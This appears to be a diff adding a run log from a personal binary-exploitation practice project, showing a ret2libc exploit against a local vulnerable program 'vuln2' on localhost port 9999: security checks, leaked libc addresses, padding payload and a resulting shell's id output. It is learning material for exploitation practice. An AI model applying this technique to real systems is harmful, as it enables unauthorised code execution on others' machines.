@@ -1,0 +1,29 @@
+### 远程模式：serve.py 监听 9999，exp 走 socket 连接
+### serve.py 日志:
+[*] listening on 0.0.0.0:9999 (one-shot)
+
+### exp 输出:
+[*] '/mnt/d/逆向/逆向学习/practice/pwn-practice/02-ret2libc/vuln2'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+[x] Opening connection to 127.0.0.1 on port 9999
+[x] Opening connection to 127.0.0.1 on port 9999: Trying 127.0.0.1
+[+] Opening connection to 127.0.0.1 on port 9999: Done
+[+] leaked puts@libc = 0x73abc9887cc0
+[+] libc base       = 0x73abc9800000
+[+] system@libc     = 0x73abc9858750
+[+] "/bin/sh"@libc  = 0x73abc99cc42f
+you said: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa@
+uid=1001(lzq) gid=1002(lzq) groups=1002(lzq),27(sudo)
+===RET2LIBC_SHELL_WORKS===
+[*] Closed connection to 127.0.0.1 port 9999
+
+### serve.py 结束日志:
+[*] listening on 0.0.0.0:9999 (one-shot)
+[+] connection from ('127.0.0.1', 39640)
